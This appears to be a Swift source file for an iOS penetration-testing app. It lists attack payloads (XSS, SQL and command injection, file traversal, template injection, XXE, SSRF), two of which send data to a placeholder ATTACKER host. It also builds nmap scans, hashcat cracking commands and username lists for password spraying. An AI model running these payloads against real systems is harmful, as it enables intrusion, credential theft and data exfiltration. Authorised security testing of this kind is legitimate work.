import Foundation

// MARK: - Payload cheat-sheet (authorised testing / CTF)

public enum PayloadLibrary {
    public static let categories: [(name: String, payloads: [String])] = [
        ("XSS", [
            "<script>alert(document.domain)</script>",
            "\"><img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "javascript:alert(1)",
            "'\"><svg onload=alert`1`>",
            "<body onpageshow=alert(1)>",
            "{{constructor.constructor('alert(1)')()}}  (AngularJS)"
        ]),
        ("SQL injection", [
            "' OR '1'='1",
            "' OR 1=1-- -",
            "admin'-- -",
            "' UNION SELECT NULL,NULL,NULL-- -",
            "1' ORDER BY 1-- -",
            "' AND SLEEP(5)-- -   (time-based)",
            "') OR ('1'='1"
        ]),
        ("Command injection", [
            "; id",
            "| id",
            "`id`",
            "$(id)",
            "&& whoami",
            "; cat /etc/passwd",
            "| curl http://ATTACKER/`whoami`"
        ]),
        ("Local File Inclusion / traversal", [
            "../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd%00",
            "php://filter/convert.base64-encode/resource=index.php",
            "..%2f..%2f..%2fetc%2fpasswd",
            "/proc/self/environ",
            "C:\\Windows\\System32\\drivers\\etc\\hosts"
        ]),
        ("SSTI (template injection)", [
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "#{7*7}",
            "{{config.items()}}   (Jinja2)",
            "{{''.__class__.__mro__[1].__subclasses__()}}   (Python)",
            "${T(java.lang.Runtime).getRuntime().exec('id')}   (Spring)"
        ]),
        ("XXE", [
            "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>",
            "<!ENTITY x SYSTEM \"http://ATTACKER/\">   (OOB exfil)"
        ]),
        ("SSRF", [
            "http://169.254.169.254/latest/meta-data/   (AWS IMDS)",
            "http://metadata.google.internal/computeMetadata/v1/   (GCP)",
            "http://127.0.0.1:80/",
            "http://[::1]/",
            "file:///etc/passwd",
            "gopher://127.0.0.1:6379/_   (Redis)"
        ]),
        ("NoSQL injection", [
            "{\"$ne\": null}",
            "{\"$gt\": \"\"}",
            "admin'||'1'=='1",
            "{\"username\": {\"$regex\": \"^a\"}}"
        ])
    ]

    public static func run(_ input: String) -> ToolOutput {
        let q = input.trimmed().lowercased()
        let shown = q.isEmpty ? categories : categories.filter { $0.name.lowercased().contains(q) }
        var out = ToolOutput()
        if shown.isEmpty {
            return ToolOutput(sections: [ReportSection("Payloads", items: [ReportItem("Result", "no category matches “\(input)”. Try: xss, sqli, ssti, lfi, ssrf, xxe, command", .low)])])
        }
        for cat in shown {
            var s = ReportSection(cat.name, note: "Authorised testing / CTF only. Replace ATTACKER with your host.")
            for p in cat.payloads { s.add("", p) }
            out.sections.append(s)
        }
        return out
    }
}

// MARK: - Nmap command builder (for use on a laptop)

public enum NmapBuilder {
    public static func run(_ input: String) -> ToolOutput {
        let t = TargetParser.stripToHost(input).isEmpty ? "TARGET" : input.trimmed()
        var s = ReportSection("Nmap commands – \(t)", note: "iOS can't run nmap (no raw sockets); copy these to a laptop. Only scan authorised targets.")
        s.add("Quick top-1000", "nmap -T4 \(t)")
        s.add("Service + version", "nmap -sV -sC -T4 \(t)")
        s.add("All TCP ports", "nmap -p- -T4 --min-rate 2000 \(t)")
        s.add("Full + version (staged)", "nmap -p- --min-rate 2000 \(t) -oA allports && nmap -sCV -p<OPEN> \(t)")
        s.add("UDP top-100", "sudo nmap -sU --top-ports 100 -T4 \(t)")
        s.add("Vuln scripts", "nmap -sV --script vuln \(t)")
        s.add("OS detection", "sudo nmap -O \(t)")
        s.add("Stealth SYN", "sudo nmap -sS -T4 \(t)")
        s.add("Through proxy", "nmap -sT -Pn --proxies socks4://127.0.0.1:9050 \(t)")
        s.add("Subnet ping sweep", "nmap -sn \(t)")
        return ToolOutput(sections: [s])
    }
}

// MARK: - Hash cracking command builder

public enum CrackCommands {
    public static func run(_ input: String) -> ToolOutput {
        let h = input.trimmed()
        var s = ReportSection("Cracking commands", note: "iOS can't run hashcat/John; copy to a laptop. hashcat modes inferred from the hash shape.")
        let modes = HashIdentifier.identify(h).items.filter { $0.label == "Candidate" }.map(\.value)
        if modes.isEmpty { s.add("Hash type", "unrecognised — see the Hash Identifier", .low) }
        for m in modes.prefix(4) {
            s.add("Likely", m)
            if let mode = m.range(of: #"-m (\S+)"#, options: .regularExpression).map({ String(m[$0]).replacingOccurrences(of: "-m ", with: "") }),
               let num = mode.split(separator: " ").first, Int(num) != nil {
                s.add("  hashcat", "hashcat -m \(num) -a 0 hash.txt rockyou.txt")
                s.add("  + rules", "hashcat -m \(num) -a 0 hash.txt rockyou.txt -r rules/best64.rule")
            }
        }
        s.add("John (auto)", "john --wordlist=rockyou.txt hash.txt")
        s.add("Brute (hashcat ?a 1-8)", "hashcat -a 3 hash.txt ?a?a?a?a?a?a?a?a --increment")
        s.add("Show cracked", "hashcat hash.txt --show   ·   john --show hash.txt")
        return ToolOutput(sections: [s])
    }
}

// MARK: - Username / email permutator

public enum UsernameGen {
    public static func permutations(first: String, last: String) -> [String] {
        let f = first.lowercased(), l = last.lowercased()
        guard !f.isEmpty, !l.isEmpty else { return [] }
        let fi = String(f.prefix(1)), li = String(l.prefix(1))
        let out = [f, l, f + l, f + "." + l, fi + l, fi + "." + l, f + li, f + "_" + l, l + f, l + "." + f, li + f, f + "-" + l, fi + li]
        var seen = Set<String>()
        return out.filter { seen.insert($0).inserted }
    }

    public static func run(_ input: String) -> ToolOutput {
        // "First Last" or "First Last :: company.com"
        let parts = input.components(separatedBy: "::")
        let nameParts = parts[0].split(whereSeparator: { $0 == " " }).map(String.init)
        guard nameParts.count >= 2 else {
            return ToolOutput(sections: [ReportSection("Username generator", items: [ReportItem("Usage", "First Last   (optionally  First Last :: company.com)", .low)])])
        }
        let domain = parts.count > 1 ? parts[1].trimmed() : nil
        let perms = permutations(first: nameParts[0], last: nameParts.last!)
        var s = ReportSection("Username candidates (\(perms.count))", note: "Common corporate username/email formats — for password-spraying candidate lists on authorised engagements.")
        for p in perms { s.add("", domain.map { "\(p)@\($0)" } ?? p) }
        return ToolOutput(sections: [s])
    }
}
